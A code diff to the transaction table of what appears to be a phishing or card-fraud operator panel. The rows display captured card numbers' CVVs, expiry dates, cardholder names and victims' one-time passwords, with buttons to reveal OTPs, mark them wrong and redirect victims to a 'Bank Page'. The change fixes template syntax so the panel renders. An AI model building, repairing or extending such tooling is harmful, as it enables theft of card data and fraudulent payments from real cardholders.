@@ -296,7 +296,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
-            <td>
+               <td>
               ${tx.otpEntered ? 
                 `<span class="otp-received">${tx.otpEntered}</span>
                  <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
@@ -306,12 +306,10 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
                   '<span class="status-badge status-otp">Waiting for OTP</span>' :
                   `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Show OTP
-                  </button>`
-
-                 <button class="bank-page-btn" onclick="redirectToBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                  </button>
+                  <button class="bank-page-btn" onclick="redirectToBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Bank Page
                   </button>`
-            
               }
             </td>
             <td>
